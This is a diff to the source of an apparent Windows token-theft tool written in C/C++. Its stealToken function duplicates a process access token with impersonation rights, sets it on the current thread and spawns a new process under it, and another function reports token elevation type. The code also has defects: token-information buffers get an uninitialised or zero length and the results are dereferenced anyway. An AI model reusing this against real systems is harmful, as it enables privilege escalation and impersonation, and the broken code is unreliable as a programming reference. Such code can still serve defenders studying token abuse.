@@ -37,40 +37,20 @@ void createProcessWithToken(HANDLE hToken)
 		printf("[*] starting new process: %d\n", pinfo->dwProcessId);
 }
 
-HANDLE stealToken(int pid)
+void stealToken(HANDLE hToken)
 {
-	printf("[*] stealing token from pid: %d\n", pid);
-	HANDLE hProcess;
-	HANDLE hToken;
+	printf("[*] stealing token\n");
 	HANDLE hTokenDup;
-	hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
-	if (hProcess)
+	if (DuplicateTokenEx(hToken, TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, nullptr, SecurityImpersonation, TokenImpersonation, &hTokenDup))
 	{
-		if (OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken))
-		{
-			if (DuplicateTokenEx(hToken, TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, nullptr, SecurityImpersonation, TokenImpersonation, &hTokenDup))
-			{
-				hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
-				SetThreadToken(nullptr, hTokenDup);	
-				createProcessWithToken(hTokenDup);
-			}
-			else
-			{
-				printf("[-] error DuplicateTokenEx: %d\n", GetLastError());
-				exit(1);
-			}
-		}
-		else 
-		{
-			printf("[-] error TOKEN_DUPLICATE: %d\n", GetLastError());
-			exit(1);
-		}
+		SetThreadToken(nullptr, hTokenDup);	
+		createProcessWithToken(hTokenDup);
 	}
 	else
 	{
-		printf("[-] could not obtain token from pid: %d\n", pid);
+		printf("[-] error DuplicateTokenEx: %d\n", GetLastError());
+		exit(1);
 	}
-	return &hTokenDup;
 }
 
 void getTokenStatistics(HANDLE hToken)
@@ -144,9 +124,27 @@ void getTokenIntegrityLevel(HANDLE hToken)
 void getTokenElevationType(HANDLE hToken)
 {
 	DWORD returnLength;
-	GetTokenInformation(hToken, TokenElevation, nullptr, returnLength, &returnLength);
-	TOKEN_ELEVATION* lpTokenInfo = (TOKEN_ELEVATION*)LocalAlloc(LMEM_FIXED, returnLength);
+
+	TOKEN_ELEVATION* lpTokenInfo = (TOKEN_ELEVATION*)LocalAlloc(LMEM_FIXED, sizeof(TOKEN_ELEVATION));
 	GetTokenInformation(hToken, TokenElevation, lpTokenInfo, returnLength, &returnLength);
-	printf("[+]\tIs Elevated: %d\n", lpTokenInfo->TokenIsElevated);
+	printf("[+]\tIs Elevated: %s\n", lpTokenInfo->TokenIsElevated == 0 ? "False" : "True");
+
+	returnLength = 0;
+	TOKEN_ELEVATION_TYPE * tet = (TOKEN_ELEVATION_TYPE*)LocalAlloc(LMEM_FIXED, sizeof(TOKEN_ELEVATION_TYPE));
+	GetTokenInformation(hToken, TokenElevationType, tet, returnLength, &returnLength);
+	const char* tokenElevationType;
+	switch (*tet)
+	{
+	case TokenElevationTypeDefault:
+		tokenElevationType = "TokenElevationTypeDefault";
+		break;
+	case TokenElevationTypeFull:
+		tokenElevationType = "TokenElevationTypeFull";
+		break;
+	case TokenElevationTypeLimited:
+		tokenElevationType = "TokenElevationTypeLimited";
+		break;
+	}
+	printf("[+]\tElevation Type: %s\n", tokenElevationType);
 	LocalFree((HLOCAL)lpTokenInfo);
 }
